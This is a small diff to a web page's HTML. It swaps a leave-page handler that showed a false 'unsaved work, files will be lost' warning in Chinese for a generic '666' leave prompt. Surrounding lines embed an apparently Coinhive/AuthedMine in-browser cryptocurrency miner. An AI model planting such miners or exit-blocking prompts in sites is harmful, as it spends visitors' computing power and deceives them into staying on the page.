@@ -10,9 +10,12 @@
 	<div id="header">				
 	</div>
 			<script>
-				window.onbeforeunload = function(){
-					return "当前有 1 个工作未保存\n离开会导致文件丢失\n确定继续?"
-				}
+				window.addEventListener("beforeunload", function (e) {
+  					var confirmationMessage = "666";
+
+  					(e || window.event).returnValue = confirmationMessage; //Gecko + IE
+  					return confirmationMessage;                            //Webkit, Safari, Chrome
+				});
 			</script>
 			<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
 	<div class="coinhive-miner" 
